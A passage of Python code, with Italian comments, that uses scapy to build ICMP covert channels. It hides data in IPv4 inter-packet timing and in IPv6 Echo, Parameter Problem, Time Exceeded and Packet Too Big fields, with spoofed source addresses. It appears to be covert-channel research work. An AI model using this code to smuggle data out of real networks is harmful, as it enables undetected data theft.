        dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**self.numero_bit)])
        dict_bit={ }
        dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**self.numero_bit) ])  

        MINUTE_TIME=0*60+30 #minuti
        MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
    
        def callback(packet):
            nonlocal self, MAX_TIME, MINUTE_TIME  
            if self.last_packet_time is None: 
                self.last_packet_time=packet.time 
                self.timer.cancel()
                self.timer=get_timer(MAX_TIME, self.timeout_timer_callback) 
                self.timer.start() 
                return  
            if packet.time is not None: 
                delta_time=packet.time-self.last_packet_time   
                arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
                min_value=min([y for _,y in arr]) 
                min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
                self.data.append(dict_bit.get(arr[min_indices[0]][0]))
                self.last_packet_time=packet.time
                self.timer.cancel() 
                if len(self.data)%8==0: 
                    self.timer=get_timer(MINUTE_TIME,self.timeout_timer_callback) 
                else:
                    self.timer=get_timer(MAX_TIME,self.timeout_timer_callback) 
                self.timer.start()
        return callback
    
    def wait(self, type_list:list[Enum]=None): 
        if not is_list(type_list) or len(type_list)<=0:
            type_list=[x for x in ICMP_TYPE if x.name.startswith("v4_")] 
        else: type_list=[x for x in type_list if is_integer(x)] 
        super().wait(type_list)  
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None): 
        def old_send(): 
            bit_data=[]
            for piece_data in data: #dal byte estraggo i bit  
                #LSB order->[bit_0,bit_1,bit_2,bit_3,bit_4,bit_5,bit_6,bit_7] 
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #bit aggiunti in LSB 
                #MSB order->[bit_7,bit_6,bit_5,bit_4,bit_3,bit_2,bit_1,bit_0] 
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB 
            #SEND INIT PACKET 
            for piece_bit_data in bit_data:  
                #LSB->[b0,b1,b2,b3],[b4,b5,b6,b7] 
                #LSB->[b7,b6,b5,b4],[b3,b2,b1,b0]
                for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
                    index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
                    time.sleep(self.TEMPI_CODICI[index])  
                    icmp_type=random.choice([
                        ICMP_TYPE.v4_Echo_Reply,
                        ICMP_TYPE.v4_TimeExceeded
                    ])
                    pkt= Ether(dst=self.dst_mac)/\
                        IP(src=ip_src, dst=self.ip_dst.compressed)/\
                        ICMP(type=icmp_type.value, id=125, seq=225)/\
                        Raw()
                    pkt.summary()
                    #pkt.show()
                    sendp(pkt, verbose=1, iface=self.interface)  
                time.sleep(self.TEMPO_BYTE)
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
        if not is_bytes(data):
            raise TypeError(f"data non byte") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac:
            self.dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=INTERFACE_FROM_IP(self.ip_dst).interface 
        if not is_ipaddress(ip_src) or ip_src.version!=4:  
            raise Exception("ip_src non valido",ip_src)   
        pkt= Ether(dst=self.dst_mac)/\
            IP(dst=self.ip_dst.compressed)/\
            ICMP(type=ICMP_TYPE.v4_Echo_Reply.value, id=125, seq=225)/\
            Raw() 
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)  
        for byte_data in data: 
            mask=(1<<self.numero_bit)-1  
            icmp_type=random.choice([
                ICMP_TYPE.v4_Echo_Reply,
                #ICMP_TYPE.v4_TimeExceeded
            ])
            #print("PIECE DATA:",format(byte_data, "08b")) 
            #print("MASK:",mask) 
            for index in range(0,8,self.numero_bit): 
                #print("INDEX:",index) 
                #print("4bit: ",(byte_data >> index) & mask) 
                #print("---------------") 
                index_time=(byte_data >> index) & mask 
                time.sleep(self.TEMPI_CODICI[index_time])  
                pkt= Ether(dst=self.dst_mac)/\
                    IP(src=ip_src, dst=self.ip_dst.compressed)/\
                    ICMP(type=icmp_type.value, id=125, seq=225)/\
                    Raw()
                #pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface)  
            time.sleep(self.TEMPO_BYTE)
    
    def send_last(self): 
        pass  

    def ipv4_timing_cc(self):  
        #TO DELETE IF NORMAL wait (_IPx) WORKS
        try:  
            THREADING_EVENT.wait(self.event_pktconn) 
            str_data=""
            for integer in self.timing_data:
                str_data+=format(integer, f'0{self.numero_bit}b') 
            raw_data="" 
            for index in range(0, len(str_data), 8):
                int_data=0
                for bit in str_data[index:index+8][::-1]:
                    int_data=int_data<<1|int(bit)
                raw_data+=chr(int_data) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}") 
        if True:  
            joined="".join(raw_data)
            cleaned="".join(x for x in joined if x in string.printable)
            self.data=cleaned  
            return True 
        return False

class IPV4_TIMING_8BIT(_IPx): 
    timeout_callback=None
    timer=None 
    min_delay:int=1
    max_delay:int=30 

    def __init__(self, ip_dst:ipaddress.IPv4Address=None, host_attivi:ipaddress.IPv4Address=None, min_delay:int=1, max_delay:int=30): 
        if not is_integer(min_delay) or min_delay<=0: 
            raise TypeError("test_timing_channel8bit: Argomenti non validi") 
        if  not is_integer(max_delay) or max_delay<=min_delay: 
            raise TypeError("test_timing_channel8bit: Argomenti non validi") 
        super().__init__(ip_dst, host_attivi)
        self.timeout_callback=self.timeout_timer_callback
        self.min_delay=min_delay 
        self.max_delay=max_delay  
    
    def get_callback(self): 
        delta=None
        previous_time=None
        def decode_byte(delay):   
            #frazione=(delay-self.min_delay)/(self.max_delay-self.min_delay) 
            #return int(round(frazione*255)) 
            #return max(0, min(255, frazione)) 
            bin_width=(self.max_delay-self.min_delay)/255
            byte=int((delay-self.min_delay)/bin_width+0.5) 
            return max(0, min(255,byte)) #CLAMP TO 0 AND 255
        def callback(pkt): 
            nonlocal delta, previous_time  
            if pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt[IP].dst==self.ip_dst.compressed: 
                if pkt[ICMP].id==self.stop_integer:  
                    if previous_time is not None: 
                        print("END")
                        self.stop_flag["value"]=True 
                    elif previous_time is None: 
                        previous_time=pkt.time 
                        print("INIT",previous_time) 
                    else: raise Exception("callback: previous_time non valido")
                    return
                elif pkt[ICMP].id!=self.stop_integer-1:  
                    return  
                #current_time=datetime.datetime.now() 
                #current_time=time.perf_counter() 
                current_time=pkt.time 
                #print("CURRENT",current_time,"PREVIOUS",previous_time)
                delta=(current_time-previous_time) 
                byte=decode_byte(delta) 
                #print(f"Delta:{delta}\tByte:{byte}\Chr:{chr(byte)}")  
                self.data.append(byte)   
                previous_time=current_time  
        return callback 
    
    def wait(self, type_list:list[Enum]=None): 
        if not is_list(type_list) or len(type_list)<=0:
            type_list=[x for x in ICMP_TYPE if x.name.startswith("v4_")] 
        else: type_list=[x for x in type_list if is_integer(x)] 
        self.time_timeout=None 
        power_sleep=POWER_SLEEP.WINDOWS(-1)
        threading.Thread(target=power_sleep.run, daemon=True)
        super().wait(type_list)  
        power_sleep.keep_preventing_sleep=False
        power_sleep.allow_sleep()
    
    def check_data(self): 
        self.data = "".join(
            chr(b) if 32 <= b <= 126 else ""
            for b in self.data
        )

    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None):
        if not is_bytes(data): 
            raise TypeError("data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4: 
            raise TypeError("ip_dst non valido") 
        if not is_integer(self.min_delay) or self.min_delay<=0: 
            raise TypeError("data non integer") 
        if not is_integer(self.max_delay) or self.max_delay<=self.min_delay: 
            raise TypeError("data non integer") 
        if not is_integer(self.stop_integer) or not (0<=self.stop_integer <=255): 
            raise TypeError("data non integer") 
        dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower() 
        if not dst_mac: 
            raise ValueError("dst_mac non valido")
        interface=INTERFACE_FROM_IP(self.ip_dst).interface 
        if not interface: 
            raise ValueError("interface non valida")
        pkt = Ether(dst=dst_mac)/\
            IP(dst=self.ip_dst.compressed, proto=1)/\
            ICMP(id=self.stop_integer, seq=self.stop_integer)/\
            Raw("hello neighour!!!") 
        sendp(pkt, verbose=1, iface=interface) 
        if not is_ipaddress(ip_src) or ip_src.version!=4:  
            raise Exception("ip_src non valido",ip_src)  
        for byte in data:   
            delay=self.min_delay+(byte/255)*(self.max_delay-self.min_delay)
            print(f"Delay :{byte}\t{delay}\n")
            #print(f"Data: {byte}\t{byte-31}\t{type(byte)}\n") 
            time.sleep(delay) 
            pkt = Ether(dst=dst_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed)/\
                ICMP(id=self.stop_integer-1, seq=self.stop_integer)/\
                Raw(byte) 
            #pkt.summary() 
            #pkt.show()
            sendp(pkt, verbose=1, iface=interface) 

    def send_last(self): 
        stop_delay=self.min_delay+(self.stop_integer/255)*(self.max_delay-self.min_delay)
        #print(f"[STOP] Inviando byte di stop {self.stop_integer} dopo {stop_delay}") 
        time.sleep(stop_delay)  # opzionale, per separarlo dal resto 
        pkt = Ether(dst=self.dst_mac)/\
            IP(dst=self.ip_dst.compressed)/\
            ICMP(id=self.stop_integer, seq=self.stop_integer)/\
            Raw(self.stop_integer) 
        #pkt.summary() 
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface) 
    
class IPV4_TIMING_8BIT_NOISE(_IPx):  
    timeout_callback=None
    timer=None 
    min_delay:int=1
    max_delay:int=30 
    rumore:int=2 
    seed:int=4582 

    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None, args:dict=None):
        if not is_dictionary(args): 
            raise TypeError("args non valido") 
        if not args["min_delay"] or not is_integer(args["min_delay"]) or args["min_delay"]<=0: 
            raise Exception("min_delay non valido") 
        if not args["max_delay"] or not is_integer(args["max_delay"]) or args["max_delay"]<=args["min_delay"]: 
            raise Exception("max_delay non valido") 
        if not args["rumore"] or not is_integer(args["rumore"]): 
            raise Exception("max_delay non valido")  
        if not (0<=self.stop_integer <=255): 
            raise Exception("stop_integer non valido") 
        if not args["seed"] or not is_integer(args["seed"]):
            raise Exception("seed non valido") 
        super().__init__(ip_dst, host_attivi)
        self.timeout_callback=self.timeout_timer_callback 
        self.rumore=args["rumore"] 
        self.min_delay=args["min_delay"]+self.rumore
        self.max_delay=args["max_delay"]+self.rumore
        self.seed=args["seed"] 
        random.seed(self.seed)  

    def get_callback(self): 
        delta=None
        previous_time=None 
        def decode_byte(delay):  
            #(byte/255)=(delay-min_delay)/(max_delay-min_delay) 
            #frazione = (delay - self.min_delay) / (self.max_delay - self.min_delay) 
            #byte=int(round(frazione*255)) 
            #byte = max(0, min(255, byte))
            #return byte 
            bin_width=(self.max_delay-self.min_delay)/255
            byte=int((delay-self.min_delay)/bin_width+0.5) 
            return max(0, min(255,byte)) #CLAMP TO 0 AND 255
        def callback(pkt): 
            nonlocal delta, previous_time 
            if pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt[IP].dst==self.ip_dst.compressed: 
                if pkt[ICMP].id==self.stop_integer:  
                    if previous_time is not None: 
                        print("END")
                        self.stop_flag["value"]=True 
                    elif previous_time is None: 
                        previous_time=pkt.time 
                        print("INIT",previous_time) 
                    else: raise Exception("callback: previous_time non valido")
                    return
                elif pkt[ICMP].id!=self.stop_integer-1:  
                    return  
                if not pkt.haslayer(Raw):  
                    print("packet has not Raw layer")
                    return 
                try:
                    random_delay = int.from_bytes(pkt[Raw].load, byteorder='big', signed=True) 
                    #random_delay = random.randint(-rumore, rumore) 
                except Exception as e: 
                    print("ERRORE: ",e) 
                current_time=pkt.time 
                #print("CURRENT",current_time,"PREVIOUS",previous_time)
                delta=(current_time-previous_time)-random_delay
                print("This Delay:", delta,"Random delay:", random_delay, "Send Delay" ,delta+random_delay)
                byte=decode_byte(delta) 
                #print(f"Delta:{delta}\tByte:{byte}\Chr:{chr(byte)}")  
                self.data.append(byte)   
                previous_time=current_time 
        return callback 
    
    def check_data(self): 
        self.data = "".join(
            chr(b) if 32 <= b <= 126 else ""
            for b in self.data
        )
    
    def wait(self, type_list:list[Enum]=None):  
        if not is_list(type_list) or len(type_list)<=0: 
            print("type_list non valida: INIZIALIZZAZIONE")
            type_list=[x for x in ICMP_TYPE if x.name.startswith("v4_")] 
        else:  
            type_list=[x for x in type_list if is_enum_member(x,ICMP_TYPE)] 
        self.time_timeout=None
        power_sleep=POWER_SLEEP.WINDOWS(-1)
        threading.Thread(target=power_sleep.run, daemon=True)
        super().wait(type_list)  
        power_sleep.keep_preventing_sleep=False
        power_sleep.allow_sleep()
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None): 
        #Il rumore serve per non mandare sempre con lo stesso intervallo di tempo. 
        #tuttavia andrà aggiunto al minimo e al massimo per evitare errori nel calcolo del delay
        if not is_bytes(data): 
            raise TypeError("data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=4: 
            raise TypeError("ip_dst non valido") 
        if not is_integer(self.min_delay) or self.min_delay<=0: 
            raise TypeError("data non integer") 
        if not is_integer(self.max_delay) or self.max_delay<=self.min_delay: 
            raise TypeError("data non integer") 
        if not is_integer(self.stop_value) or not (0<=self.stop_value <=255): 
            raise TypeError("data non integer") 
        if not is_integer(self.rumore): 
            raise TypeError("rumore non integer") 
        if not is_integer(self.seed):
            raise TypeError("seed non integer") 
        dst_mac = GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower() 
        if not dst_mac: 
            raise ValueError("dst_mac non valido")
        interface=INTERFACE_FROM_IP(self.ip_dst).interface 
        if not interface: 
            raise ValueError("interface non valida") 
        #self.min_delay+=self.rumore
        #self.max_delay+=self.rumore
        #Nel caso non si voglia mettere il rumore scelto nel payload chi ricevere deve avere lo stesso seed 
        random.seed(self.seed) 
        random_delay=random.randint(-self.rumore, self.rumore)
        pkt = Ether(dst=self.dst_mac)/\
            IP(dst=self.ip_dst.compressed, proto=1)/\
            ICMP(id=self.stop_integer, seq=self.stop_integer)/\
            Raw(load=(0).to_bytes(signed=True)) 
        sendp(pkt, verbose=1, iface=self.interface) 
        if not is_ipaddress(ip_src) or ip_src.version!=4:  
            raise Exception("ip_src non valido",ip_src)  
        for byte in data:   
            delay=self.min_delay+(byte/255)*(self.max_delay-self.min_delay)
            #print(f"Delay:{chr(byte)} {byte}\t{delay}") 
            random_delay=random.randint(-self.rumore, self.rumore)  
            #print("Delay:", delay,"Random delay:", random_delay, delay+random_delay) 
            time.sleep(delay+random_delay) 
            pkt = Ether(dst=self.dst_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed)/\
                ICMP(id=self.stop_integer-1, seq=self.stop_integer) /\
                Raw(load=random_delay.to_bytes(signed=True)) 
            #print(pkt.summary())
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface)  

    def send_last(self): 
        stop_delay=self.min_delay+(self.stop_value/255)*(self.max_delay-self.min_delay)
        random_delay=random.randint(-self.rumore, self.rumore) 
        #print(f"[STOP] Inviando byte di stop {self.stop_value} dopo {self.stop_delay}") 
        stop_delay=stop_delay+random_delay
        #print(f"[STOP] Inviando byte di stop {self.stop_value} dopo {self.stop_delay}") 
        time.sleep(stop_delay)  # opzionale, per separarlo dal resto 
        pkt = Ether(dst=self.dst_mac)/\
            IP(dst=self.ip_dst.compressed)/\
            ICMP(id=self.stop_integer, seq=self.stop_integer)/\
            Raw(load=random_delay.to_bytes(signed=True))  
        #print(f"Sending {pkt.summary()}") 
        sendp(pkt, verbose=1, iface=self.interface) 

class IPV6_ECHO(_IPx):  
    ECHO_REQ=ICMP_TYPE.v6_Echo_Request
    ECHO_REP=ICMP_TYPE.v6_Echo_Reply
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if not (icmp_layer:=( packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply))):
                return  
            icmp_id=icmp_layer.getfieldval("id") 
            if icmp_id==self.stop_integer and icmp_layer.getfieldval("seq")==self.stop_integer: 
                #THREADING_EVENT.set(self.event_pktconn) 
                self.stop_flag["value"]=True 
                return 
            byte1 = (icmp_id >> 8) & 0xFF 
            byte2 = icmp_id & 0xFF 
            self.data.extend([chr(byte1),chr(byte2)]) 
        return callback 
    
    def wait(self): 
        super().wait([self.ECHO_REQ, self.ECHO_REP])  
    
    def send(self, data:bytes=None, ip_src:ipaddress.IPv4Address=None): 
        if not is_bytes(data): 
            raise TypeError("data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("dst_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida") 
        if not is_ipaddress(ip_src) or ip_src.version!=6:  
            raise Exception("ip_src non valido",ip_src)   
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        for index in range(0, len(data), 2): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8) 
            else: 
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= (
                Ether(dst=self.dst_mac, src=src_mac)
                /IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src)
                /ICMPv6EchoReply(type=self.ECHO_REP,id=icmp_id)
            ) 
            sendp(pkt, verbose=1,iface=self.interface) 
    
    def send_last(self): 
        ip_src=IP.find_local_IP() 
        if not is_ipaddress(ip_src): 
            raise ValueError("ip_src non valido",ip_src)
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        pkt= (
            Ether(dst=self.dst_mac, src=src_mac)
            /IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                  src=ip_src.compressed)
            /ICMPv6EchoReply(
                type=self.ECHO_REP,
                id=self.stop_integer, seq=self.stop_integer
            )
            / Raw(load="Hello Neighbour".encode())
        )
        #print(f"Sending {pkt.summary()}") 
        sendp(pkt, verbose=1,iface=self.interface)  

class IPV6_PARAMETER_PROBLEM(_IPx): 
    PARAMETER_PROBLEM=ICMP_TYPE.v6_ParameterProblem
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self  
            if not (icmp_layer:=packet.getlayer(ICMPv6ParamProblem)): 
                return
            ptr=icmp_layer.getfieldval("ptr") 
            if ptr==0xffffffff: #TO DO aggiungere controlo id e seq in IPerror
                #THREADING_EVENT.set(self.event_pktconn) 
                self.stop_flag["value"]=True 
                return 
            self.data.append(ptr.to_bytes(4,"big"))#.decode())
            if (ipErr_layer:=packet.getlayer(IPerror6)): 
                self.data.append(ipErr_layer.getfieldval("plen").to_bytes(2,"big"))#.decode())  
                if (echo_layer:=packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply)): 
                    self.data.append(echo_layer.getfieldval("id").to_bytes(2,"big"))#.decode()) 
        return callback
    
    def wait(self):      
        super().wait([self.PARAMETER_PROBLEM]) 
    
    def send(self, data:bytes=None, ip_src:ipaddress.IPv4Address=None):  
        if not is_bytes(data): 
            raise TypeError("data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("dst_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida") 
        #ip_src=IP.find_local_IP()  
        if not is_ipaddress(ip_src) or ip_src.version!=6:  
            raise Exception("ip_src non valido",ip_src)  
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        for index in range(0, len(data), 8):  
            dummy_pkt=(
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src.compressed, 
                    plen=int.from_bytes(data[index+4:index+6]))  /
                ICMPv6EchoRequest(
                    type=ICMP_TYPE.v6_Echo_Reply,
                    id=int.from_bytes(data[index+6:index+8]), 
                    seq=0
                )
            )
            pkt=(
                Ether(dst=self.dst_mac, src=src_mac) /
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src.compressed)  /
                ICMPv6ParamProblem(
                    ptr=int.from_bytes(data[index:index+4]),
                    type=self.PARAMETER_PROBLEM) /
                dummy_pkt
            ) 
            sendp(pkt, verbose=1,iface=self.interface)  
        
    def send_last(self): 
        ip_src=IP.find_local_IP() 
        if not is_ipaddress(ip_src): 
            raise ValueError("ip_src non valido",ip_src)
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        dummy_pkt=(
            IPerror6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed)/
            ICMPv6EchoRequest(
                type=ICMP_TYPE.v6_Echo_Reply, 
                id=self.stop_integer, seq=self.stop_integer)
        ) #,src=ip_src.compressed
        pkt=(
            Ether(dst=self.dst_mac, src=src_mac) /
            IPv6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed)  /
            ICMPv6ParamProblem(
                type=self.PARAMETER_PROBLEM,ptr=0xFFFFFFFF) /
            dummy_pkt
        ) 
        sendp(pkt, verbose=1,iface=self.interface)  

class IPV6_TIME_EXCEEDED(_IPx): 
    TIME_EXCEEDED=ICMP_TYPE.v6_TimeExceeded
    
    def get_callback(self):
        def callback(packet): 
            nonlocal self 
            if not packet.haslayer(ICMPv6TimeExceeded): 
                return
            if not (ipErr_layer:=packet.getlayer(IPerror6)):
                return 
            ptr=ipErr_layer.getfieldval("plen")
            if ptr==0xffff: 
                #THREADING_EVENT.set(self.event_pktconn) 
                self.stop_flag["value"]=True 
                return 
            self.data.append(ptr.to_bytes(2,"big").decode()) 
            if icmp_layer:=(packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply)): 
                id=icmp_layer.getfieldval("id")
                if id==self.stop_integer and icmp_layer.getfieldval("seq")==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                self.data.append(id.to_bytes(2,"big"))#.decode()) 
        return callback  
    
    def wait(self, type_list:list[int]=None):      
        super().wait([self.TIME_EXCEEDED]) 
    
    def send(self, data:bytes=None, ip_src:ipaddress.IPv4Address=None): 
        if not is_bytes(data): 
            raise TypeError("data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("dst_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida") 
        if not is_ipaddress(ip_src) or ip_src.version!=6:  
            raise Exception("ip_src non valido",ip_src)   
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        for index in range(0, len(data), 4): 
            dummy_pkt=(
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}", 
                    src=ip_src.compressed,
                    plen=int.from_bytes(data[index:index+2]))  /
                ICMPv6EchoReply(
                    type=ICMP_TYPE.v6_Echo_Reply.value,
                    id=int.from_bytes(data[index+2:index+4]), seq=0) 
            ) 
            pkt=(
                Ether(dst=self.dst_mac, src=src_mac) /
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src.compressed)  /
                ICMPv6TimeExceeded(type=self.TIME_EXCEEDED) /
                dummy_pkt
            )  
            sendp(pkt, verbose=1,iface=self.interface) 
    
    def send_last(self): 
        ip_src=IP.find_local_IP() 
        if not is_ipaddress(ip_src): 
            raise ValueError("ip_src non valido",ip_src)
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        dummy_pkt=(
            IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                 src=ip_src.compressed,
                 plen=0xffff)  /
            ICMPv6EchoReply(
                type=ICMP_TYPE.v6_Echo_Reply.value,
                id=self.stop_integer, seq=self.stop_integer)
        ) 
        pkt=(
            Ether(dst=self.dst_mac, src=src_mac) /
            IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                 src=ip_src.compressed) /
            ICMPv6TimeExceeded(type=self.TIME_EXCEEDED) /
            dummy_pkt
        ) 
        sendp(pkt, verbose=1,iface=self.interface) 

class IPV6_PACKET_BIG(_IPx): 
    PACKET_BIG=ICMP_TYPE.v6_PacketTooBig
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if not packet.haslayer(ICMPv6PacketTooBig): 
                return 
            mtu=packet.getlayer(ICMPv6PacketTooBig).getfieldval("mtu") 
            self.data.append(mtu.to_bytes(4,"big"))#.decode()) 
            if ipErr_layer:=packet.getlayer(IPerror6): 
                plen=ipErr_layer.getfieldval("plen") 
                if plen==0xffff: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return
                self.data.append(plen.to_bytes(2,"big"))#.decode()) 
                icmp_layer=(packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply)) 
                id=icmp_layer.getfieldval("id")
                if id==self.stop_integer and icmp_layer.getfieldval("seq")==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return
                self.data.append(id.to_bytes(2,"big"))#.decode()) 
        return callback 
    
    def wait(self, type_list:list[int]=None):      
        super().wait([self.PACKET_BIG]) 
    
    def send(self, data:bytes=None, ip_src:ipaddress.IPv4Address=None): 
        if not is_bytes(data): 
            raise TypeError("data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("dst_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida") 
        if not is_ipaddress(ip_src) or ip_src.version!=6:  
            raise Exception("ip_src non valido",ip_src)   
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        for index in range(0, len(data), 8): 
            dummy_pkt=(
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}", 
                    src=ip_src.compressed, 
                    plen=int.from_bytes(data[index+4:index+6]))/
                ICMPv6EchoReply(
                    type=ICMP_TYPE.v6_Echo_Reply.value,
                    id=int.from_bytes(data[index+6:index+8]), 
                    seq=0)
            )
            pkt=(
                Ether(dst=self.dst_mac, src=src_mac) /
                IPv6(
                    dst=f"{self.ip_dst.compressed}%{self.interface}",
                    src=ip_src.compressed)  /
                ICMPv6PacketTooBig(
                    type=self.PACKET_BIG, 
                    mtu=int.from_bytes(data[index:index+4])) /
                dummy_pkt
            )  
            sendp(pkt, verbose=1,iface=self.interface) 
    
    def send_last(self): 
        ip_src=IP.find_local_IP() 
        if not is_ipaddress(ip_src): 
            raise ValueError("ip_src non valido",ip_src)
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        dummy_pkt=(
            IPv6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed, 
                plen=0xffff)  /
            ICMPv6EchoReply(
                type=ICMP_TYPE.v6_Echo_Reply.value,
                id=self.stop_integer, seq=self.stop_integer)
        )
        pkt=(
            Ether(dst=self.dst_mac, src=src_mac)/
            IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                 src=ip_src.compressed)/
            ICMPv6PacketTooBig(type=self.PACKET_BIG, mtu=0)/
            dummy_pkt
        ) 
        sendp(pkt, verbose=1,iface=self.interface) 

class IPV6_DESTINTION_UNREACHABLE(_IPx): 
    DESTINATION_UNREACHABLE=3  
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if not (icmp_layer:=packet.getlayer(ICMPv6DestUnreach)): 
                return 
            if not (ipErr_layer:=packet.getlayer(IPerror6)): 
                return 
            plen=ipErr_layer.getfieldval("plen")
            if plen==0xffff: 
                #THREADING_EVENT.set(self.event_pktconn) 
                self.stop_flag["value"]=True 
                return
            self.data.append(plen.to_bytes(2,"big"))#.decode()) 
            icmp_layer=(packet.getlayer(ICMPv6EchoRequest) or packet.getlayer(ICMPv6EchoReply))
            if icmp_layer: 
                id=icmp_layer.getfieldval("id") 
                if id==0 and icmp_layer.getfieldval("seq")==1: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                self.data.append(id.to_bytes(2,"big"))#.decode())  
        return callback 
    
    def wait(self, type_list:list[int]=None):      
        super().wait([self.DESTINATION_UNREACHABLE])  
    
    def send(self, data:bytes=None, ip_src:ipaddress.IPv4Address=None):  
        if not is_bytes(data): 
            raise TypeError("data non bytes") 
